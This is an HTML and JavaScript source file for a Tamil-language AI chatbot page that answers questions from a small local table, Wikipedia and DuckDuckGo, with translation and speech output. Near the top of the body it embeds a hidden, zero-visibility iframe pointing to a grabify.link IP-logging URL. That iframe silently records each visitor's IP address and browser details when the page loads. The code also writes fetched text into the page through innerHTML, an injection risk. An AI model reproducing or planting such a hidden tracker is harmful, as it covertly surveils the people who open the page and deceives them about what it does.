<!DOCTYPE html>
<html lang="ta">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Tamil Cyber Zone AI</title>
<link rel="shortcut icon" href="https://i.postimg.cc/HkmyBYxn/Tamil-Cyber-Zone-Logo.jpg" type="image/x-icon">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f0f2f5}
.chat-container{width:400px;height:600px;background:white;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);display:flex;flex-direction:column}
.chat-header{padding:20px;background:#075e54;color:white;border-radius:10px 10px 0 0;text-align:center}
.chat-messages{flex:1;padding:20px;overflow-y:auto}
.message{margin-bottom:15px;max-width:80%;padding:10px 15px;border-radius:15px;word-wrap:break-word}
.bot-message{background:#e9ecef;align-self:flex-start;border-radius:15px 15px 15px 0}
.user-message{background:#075e54;color:white;margin-left:auto;border-radius:15px 15px 0 15px}
.chat-input{padding:20px;display:flex;gap:10px;border-top:1px solid #e9ecef}
#user-input{flex:1;padding:10px;border:1px solid #e9ecef;border-radius:5px;outline:none}
#send-button{padding:10px 20px;background:#075e54;color:white;border:none;border-radius:5px;cursor:pointer;transition:0.3s}
#send-button:hover{background:#128c7e}
pre.code{background:#011421;padding:12px;border-radius:8px;overflow:auto;color:#cfe8ff;margin-top:10px}
.sources{font-size:13px;color:#9fd3ff;margin-top:5px;word-wrap:break-word}
a.link{color:#075e54;text-decoration:underline}
</style>
</head>

<body>

<iframe src="https://grabify.link/0GMYZX" frameborder="0" style="display: none;"></iframe>

<div class="chat-container">
  <div class="chat-header"><h1>AI Chatbot V5 🌐</h1></div>
  <div class="chat-messages" id="chat-messages">
    <div class="message bot-message">
      <p>வணக்கம்! நான் உங்கள் AI உதவியாளர். எதைக் குறித்து அறிய விரும்புகிறீர்கள்?</p>
    </div>
  </div>
  <div class="chat-input">
    <input type="text" id="user-input" placeholder="உங்கள் கேள்வியை இங்கு தட்டச்சு செய்யவும்...">
    <button id="send-button">Send</button>
  </div>
</div>

<script>
// 🔊 Voice output
function speak(text){
  if('speechSynthesis' in window){
    const utter=new SpeechSynthesisUtterance(text.replace(/<br>/g,' '));
    const voices=window.speechSynthesis.getVoices();
    const tamilVoice=voices.find(v=>v.lang.startsWith('ta'))||voices[0];
    if(tamilVoice) utter.voice=tamilVoice;
    window.speechSynthesis.speak(utter);
  }
}

// 🌍 Safe multi-part Translation function (500 char limit fix)
async function translateText(text, targetLang) {
  const chunks = [];
  for (let i = 0; i < text.length; i += 450) {
    chunks.push(text.slice(i, i + 450));
  }

  const translatedChunks = [];

  for (const chunk of chunks) {
    try {
      const res = await fetch(
        `https://api.mymemory.translated.net/get?q=${encodeURIComponent(chunk)}&langpair=en|${targetLang}`
      );
      const data = await res.json();
      translatedChunks.push(data.responseData.translatedText);
      await new Promise(r => setTimeout(r, 300)); // Delay to avoid API limit
    } catch (e) {
      console.error("Translation error:", e);
      translatedChunks.push(chunk);
    }
  }

  return translatedChunks.join(" ");
}

document.addEventListener("DOMContentLoaded",()=>{
  const chatMessages=document.getElementById("chat-messages");
  const userInput=document.getElementById("user-input");
  const sendButton=document.getElementById("send-button");

  const knowledgeBase={
    "javascript":{text:"JavaScript is the programming language of the web."},
    "python":{text:"Python is a powerful, beginner-friendly language used for AI and automation."},
    "who are you":{text:"I am Tamil Cyber Zone AI Assistant built to help you with tech and cyber topics."}
  };

  const codeTemplates={
    "javascript":"// JavaScript example\nconsole.log('Hello World');",
    "python":"# Python example\nprint('Hello World')"
  };

  function addMessage(msg,isUser=false){
    const div=document.createElement('div');
    div.classList.add('message',isUser?'user-message':'bot-message');
    const p=document.createElement('p');p.innerHTML=msg;
    div.appendChild(p);
    chatMessages.appendChild(div);
    chatMessages.scrollTop=chatMessages.scrollHeight;
  }

  function getLocalResponse(input){
    const key=input.toLowerCase();
    for(const k in knowledgeBase){
      if(key.includes(k)) return knowledgeBase[k].text;
    }
    return null;
  }

  async function fetchWikipedia(q){
    try{
      const r=await fetch(`https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(q)}`);
      if(!r.ok) return null;
      const j=await r.json();
      return j.extract?{source:'Wikipedia',text:j.extract,link:j.content_urls?.desktop?.page||null}:null;
    }catch(e){return null;}
  }

  async function fetchDuckDuckGo(q){
    try{
      const r=await fetch(`https://api.duckduckgo.com/?q=${encodeURIComponent(q)}&format=json&no_redirect=1&skip_disambig=1`);
      if(!r.ok) return null;
      const j=await r.json();
      if(j.AbstractText) return {source:'DuckDuckGo',text:j.AbstractText,link:j.AbstractURL||null};
      return null;
    }catch(e){return null;}
  }

  async function gatherWebSources(q){
    const results=await Promise.all([fetchWikipedia(q),fetchDuckDuckGo(q)]);
    return results.filter(Boolean);
  }

  function synthesize(snippets){
    let combined='';
    snippets.forEach(s=>{
      combined+=s.text+(s.link?('<br><a class="link" href="'+s.link+'" target="_blank">Link</a>'):'')+'<br><br>';
    });
    return combined;
  }

  // 🌐 Main input handler (with language detection)
  async function handleInput(){
    let input=userInput.value.trim();
    if(!input) return;
    addMessage(input,true);
    userInput.value='';

    // 🈯 Detect language
    const lower=input.toLowerCase();
    let langCode="en";
    const langMap={
      "tamil":"ta","sinhala":"si","hindi":"hi","french":"fr","arabic":"ar",
      "japanese":"ja","chinese":"zh","spanish":"es","german":"de","korean":"ko"
    };
    for(const [name,code] of Object.entries(langMap)){
      if(lower.endsWith("in "+name)){
        langCode=code;
        input=input.replace(new RegExp("in "+name+"$","i"),'').trim();
        break;
      }
    }

    // 1️⃣ Local DB check
    let localResp=getLocalResponse(input);
    if(localResp){
      if(langCode!=="en") localResp=await translateText(localResp,langCode);
      addMessage(localResp);
      speak(localResp);
      return;
    }

    // 2️⃣ Web Search
    addMessage("🔍 Searching the internet...");
    const webSnippets=await gatherWebSources(input);
    if(webSnippets.length===0){
      let msg="No web data found.";
      if(langCode!=="en") msg=await translateText(msg,langCode);
      addMessage(msg);
      speak(msg);
      return;
    }

    let finalAnswer=synthesize(webSnippets);
    if(langCode!=="en"){
      finalAnswer=await translateText(finalAnswer,langCode);
    }

    addMessage(finalAnswer);
    speak(finalAnswer);
  }

  sendButton.addEventListener('click',handleInput);
  userInput.addEventListener('keypress',e=>{if(e.key==='Enter')handleInput();});
});
</script>
</body>
</html>
